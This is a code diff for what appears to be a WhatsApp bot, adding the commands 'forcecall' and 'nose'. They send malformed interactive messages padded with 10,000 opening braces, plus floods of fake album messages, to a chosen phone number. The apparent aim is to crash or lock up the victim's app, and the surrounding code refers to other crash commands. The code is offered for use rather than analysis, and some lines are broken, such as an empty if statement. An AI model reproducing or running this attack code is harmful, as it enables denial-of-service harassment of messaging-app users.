@@ -610,8 +610,189 @@ async function invisSqL(isTarget) {
     messageId: msg.key.id
   });
 }
+///funcion//
+async function ForceCall(target) {
+let InJectXploit = JSON.stringify({
+status: true,
+criador: "TheXtordcv",
+resultado: {
+type: "md",
+ws: {
+_events: {
+"CB:ib,,dirty": ["Array"]
+},
+_eventsCount: 800000,
+_maxListeners: 0,
+url: "wss://web.whatsapp.com/ws/chat",
+config: {
+version: ["Array"],
+browser: ["Array"],
+waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
+sockCectTimeoutMs: 20000,
+keepAliveIntervalMs: 30000,
+logger: {},
+printQRInTerminal: false,
+emitOwnEvents: true,
+defaultQueryTimeoutMs: 60000,
+customUploadHosts: [],
+retryRequestDelayMs: 250,
+maxMsgRetryCount: 5,
+fireInitQueries: true,
+auth: {
+Object: "authData"
+},
+markOnlineOnsockCect: true,
+syncFullHistory: true,
+linkPreviewImageThumbnailWidth: 192,
+transactionOpts: {
+Object: "transactionOptsData"
+},
+generateHighQualityLinkPreview: false,
+options: {},
+appStateMacVerification: {
+Object: "appStateMacData"
+},
+mobile: true
+}
+}
+}
+});
+let msg = await generateWAMessageFromContent(
+target, {
+viewOnceMessage: {
+message: {
+interactiveMessage: {
+header: {
+title: "",
+hasMediaAttachment: false,
+},
+body: {
+text: "by 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘",
+},
+nativeFlowMessage: {
+messageParamsJson: "{".repeat(10000),
+buttons: [{
+name: "single_select",
+buttonParamsJson: InJectXploit,
+},
+{
+name: "call_permission_request",
+buttonParamsJson: InJectXploit + "{",
+},
+],
+},
+},
+},
+},
+}, {}
+);
 
+await conn.relayMessage(target, msg.message, {
+messageId: msg.key.id,
+participant: {
+jid: target
+},
+});
+}
+//fuction//
+async function albumgip(target) {
+const gif = {
+    video: gip,
+    caption: "© Last - 🍀"
+  };
+
+  const album = await generateWAMessageFromContent(target, {
+    albumMessage: {
+      expectedImageCount: 0, // ubah ke 100 kalau g ke kirim
+      expectedVideoCount: 25
+    }
+  }, {
+    userJid: target,
+    upload: client.waUploadToServer
+  });
+
+  await conn.relayMessage(target, album.message, { messageId: album.key.id });
+
+  for (let i = 0; i < 25; i++) { 
+    const msg = await generateWAMessage(target, gif, {
+      upload: client.waUploadToServer
+    });
+
+    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));
+
+    msg.message[type].contextInfo = {
+      mentionedJid: [
+      "13135550002@s.whatsapp.net",
+      ],
+      participant: "0@s.whatsapp.net",
+      remoteJid: "status@broadcast",
+      messageAssociation: {
+        associationType: 1,
+        parentMessageKey: album.key
+      }
+    };
+
+    await conn.relayMessage(target, msg.message, {
+    messageId: msg.key.id
+    }, {});
+  }
+}
 switch(command) {
+case 'forcecall': {
+  if (!isBot) return 
+
+  let target = m.mentionedJid[0] 
+    ? m.mentionedJid[0] 
+    : m.quoted 
+      ? m.quoted.sender 
+      : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+
+  if (!target || !target.includes('@s.whatsapp.net')) 
+
+  await conn.sendMessage(m.chat, { text: 'null </>' }, { quoted: m });
+  await albumgip(target);
+  await sleep(2000)
+  await albumgip(target);
+  await sleep(2000)
+  await albumgip(target);
+  await sleep(2000)
+  await albumgip(target);
+  await sleep(2000)
+  await albumgip(target);
+  await albumgip(target);
+  await albumgip(target);
+  await albumgip(target);
+  await conn.sendMessage(m.chat, { text: 'by 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘' }, { quoted: n });
+}
+break;
+case 'nose': {
+  if (!isBot) return 
+
+  let target = m.mentionedJid[0] 
+    ? m.mentionedJid[0] 
+    : m.quoted 
+      ? m.quoted.sender 
+      : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+
+  if (!target || !target.includes('@s.whatsapp.net')) 
+
+  await conn.sendMessage(m.chat, { text: 'null </>' }, { quoted: m });
+  await ForceCall(target);
+  await sleep(2000)
+  await ForceCall(target);
+  await sleep(2000)
+  await ForceCall(target);
+  await sleep(2000)
+  await ForceCall(target);
+  await sleep(2000)
+  await ForceCall(target);
+  await ForceCall(target);
+  await ForceCall(target);
+  await ForceCall(target);
+  await conn.sendMessage(m.chat, { text: 'by 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘' }, { quoted: n });
+}
+break;
+
 case "crash-home":{
 if (!isBot && !isCreator) return 
 let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')
